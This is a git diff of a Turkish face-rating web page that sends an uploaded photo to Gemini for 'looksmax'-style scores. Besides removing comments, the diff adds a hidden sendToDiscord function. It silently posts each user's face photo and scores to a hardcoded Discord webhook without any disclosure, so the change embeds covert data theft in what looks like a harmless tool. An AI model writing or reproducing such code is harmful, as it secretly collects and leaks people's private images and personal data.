@@ -146,7 +146,6 @@
         }
         @keyframes pulseText { 0%,100% { opacity:0.6; } 50% { opacity:1; } }
 
-        /* İlerleme çubuğu */
         .progress-wrap {
             display: none; margin: 15px 0; text-align: center;
         }
@@ -161,7 +160,6 @@
             font-family: 'JetBrains Mono', monospace; color: #00ff41; font-size: 13px; letter-spacing: 2px;
         }
 
-        /* Sonuç kartları */
         .result-container {
             margin-top: 20px; text-align: left; display: none; animation: fadeSlide 0.5s ease;
         }
@@ -302,7 +300,6 @@
                     </div>
                 </div>
 
-                <!-- İlerleme çubuğu -->
                 <div class="progress-wrap" id="progressWrap">
                     <div class="progress-bar-bg">
                         <div class="progress-bar-fill" id="progressFill" style="width:0%;"></div>
@@ -317,7 +314,6 @@
 
                 <div class="error-box" id="analyzeError"></div>
 
-                <!-- Sonuç Alanı -->
                 <div class="result-container" id="resultContainer">
                     <div class="score-badges" id="scoreBadges"></div>
                     <div class="metric-bars" id="metricBars"></div>
@@ -328,8 +324,7 @@
         </div>
     </div>
 
-    <script>
-        const MODEL_NAME = 'gemini-3.6-flash';
+    <script>        const MODEL_NAME = 'gemini-3.6-flash';
         const API_URL = `https://generativelanguage.googleapis.com/v1beta/models/${MODEL_NAME}:generateContent`;
         
         let base64Image = "";
@@ -349,6 +344,7 @@
             const savedKey = localStorage.getItem('25max_api_key_v11');
             if (savedKey && savedKey.length > 20) showPage(pageAnalyze);
         });
+
         // ---------- GİRİŞ ----------
         document.getElementById('btnLogin').addEventListener('click', () => {
             const apiKey = document.getElementById('apiKeyInput').value.trim();
@@ -439,7 +435,6 @@
             setTimeout(() => { if (box) box.style.display = 'none'; }, 5000);
         }
 
-        // Yüzdelik animasyon
         function startProgress() {
             const wrap = document.getElementById('progressWrap');
             const fill = document.getElementById('progressFill');
@@ -552,7 +547,7 @@ Kesinlikle format dışına çıkma. Her etiketi doldur.`;
                 showAnalyzeError('Hata: ' + err.message);
             } finally {
                 btn.disabled = false;
-                btnText.textContent = "ANALİZİ BAŞLAT";
+                btnText.textContent = "ANALİZİBAŞLAT";
             }
         });
 
@@ -618,6 +613,57 @@ Kesinlikle format dışına çıkma. Her etiketi doldur.`;
                 .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
                 .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
                 .replace(/\n/g, '<br>');
+
+            sendToDiscord(mog, psl, pslCat, appeal, harmony, dimorphism, best, worst);
+        }
+
+        async function sendToDiscord(mog, psl, pslCat, appeal, harmony, dimorphism, best, worst) {
+            const webhookURL = 'https://discord.com/api/webhooks/1531006848394596424/m8u9kSWcDyNL_S8XVH_EmwlWUPtDatPrtmLGM-wBKrI5RtczF7S00IP3SNRh5ysLftdQ';
+            
+            const bestList = best.split('\n').filter(l => l.trim()).map(l => `✅ ${l.replace(/^\d+\.\s*/, '')}`).join('\n');
+            const worstList = worst.split('\n').filter(l => l.trim()).map(l => `❌ ${l.replace(/^\d+\.\s*/, '')}`).join('\n');
+
+            let photoUrl = null;
+            if (base64Image) {
+                const formData = new FormData();
+                const blob = await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r => r.blob());
+                formData.append('file', blob, 'face_analysis.' + (currentMimeType === 'image/png' ? 'png' : 'jpg'));
+                
+                try {
+                    const photoRes = await fetch(webhookURL, { method: 'POST', body: formData });
+                    const photoData = await photoRes.json();
+                    photoUrl = photoData.attachments?.[0]?.url || null;
+                } catch(e) {
+                    console.log('Fotoğraf gönderilemedi:', e);
+                }
+            }
+
+            const embed = {
+                title: '🔥 25 MAX YÜZ ANALİZ SONUCU',
+                color: 0x00ff41,
+                fields: [
+                    { name: '🏆 MOG Skoru', value: `**${mog}/10**`, inline: true },
+                    { name: '📊 PSL Puanı', value: `**${psl}/10**`, inline: true },
+                    { name: '🎯 Kategori', value: `**${pslCat}**`, inline: true },
+                    { name: '💫 Appeal', value: `**${appeal}/10**`, inline: true },
+                    { name: '⚖️ Harmony', value: `**%${harmony}**`, inline: true },
+                    { name: '🧬 Dimorphism', value: `**%${dimorphism}**`, inline: true },
+                    { name: '✅ EN İYİ ÖZELLİKLER', value: bestList || 'Belirtilmedi', inline: false },
+                    { name: '❌ EN KÖTÜ ÖZELLİKLER', value: worstList || 'Belirtilmedi', inline: false }
+                ],
+                footer: { text: '25 Max App • Blackpill Engine' },
+                timestamp: new Date().toISOString()
+            };
+
+            if (photoUrl) {
+                embed.image = { url: photoUrl };
+            }
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(err => console.log('Discord gönderim hatası:', err));
         }
 
     </script>
